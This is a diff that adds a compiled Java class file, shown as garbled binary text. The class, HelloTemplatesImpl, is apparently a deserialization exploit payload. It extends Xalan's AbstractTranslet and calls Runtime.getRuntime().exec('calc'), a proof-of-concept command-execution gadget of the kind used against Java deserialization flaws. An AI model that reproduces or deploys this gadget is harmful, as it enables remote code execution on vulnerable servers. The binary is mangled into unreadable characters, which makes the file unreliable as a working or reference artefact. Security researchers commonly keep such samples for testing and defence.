@@ -1,0 +1,19 @@
+ʾ꾀34
+$
+%&'
+%()
+*+,<init>()VCodeLineNumberTableLocalVariableTableeLjava/lang/Exception;thisLHelloTemplatesImpl;
+StackMapTable+)	transformr(Lcom/sun/org/apache/xalan/internal/xsltc/DOM;[Lcom/sun/org/apache/xml/internal/serializer/SerializationHandler;)Vdocument-Lcom/sun/org/apache/xalan/internal/xsltc/DOM;handlersB[Lcom/sun/org/apache/xml/internal/serializer/SerializationHandler;
+Exceptions-樌com/sun/org/apache/xalan/internal/xsltc/DOM;Lcom/sun/org/apache/xml/internal/dtm/DTMAxisIterator;Lcom/sun/org/apache/xml/internal/serializer/SerializationHandler;)Viterator5Lcom/sun/org/apache/xml/internal/dtm/DTMAxisIterator;handlerALcom/sun/org/apache/xml/internal/serializer/SerializationHandler;
+SourceFileHelloTemplatesImpl.java	
+./0calc12java/lang/Exception3
+HelloTemplatesImpl@com/sun/org/apache/xalan/internal/xsltc/runtime/AbstractTranslet9com/sun/org/apache/xalan/internal/xsltc/TransletExceptionjava/lang/Runtime
+getRuntime()Ljava/lang/Runtime;exec'(Ljava/lang/String;)Ljava/lang/Process;printStackTrace!	
+|*瀁耂怄W瀈L+怆ခ
+
+
+
+
+?က
+ Iက
+* !"#
